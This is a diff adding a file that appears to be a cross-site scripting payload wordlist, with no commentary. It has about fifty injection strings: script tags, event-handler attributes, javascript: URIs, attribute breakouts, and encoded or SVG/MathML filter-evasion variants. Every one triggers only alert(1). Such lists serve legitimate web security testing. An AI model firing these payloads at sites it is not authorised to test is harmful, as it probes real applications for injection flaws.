@@ -1,0 +1,51 @@
+<script>alert(1)</script>
+<script>alert`1`</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert`1`>
+<body onload=alert(1)>
+<body/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<details/open/ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input/onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe/src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>click</a>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+<svg><script>alert(1)</script>
+<svg><script>alert`1`</script>
+<math><mtext></math><img src=x onerror=alert(1)>
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<img src=x onerror="alert(String.fromCharCode(88,83,83))">
+<svg onload="alert(1)">
+<svg onload='alert(1)'>
+<body onload="alert(1)">
+<details open ontoggle="alert(1)">
+<input onfocus="alert(1)" autofocus>
+<select onfocus="alert(1)" autofocus>
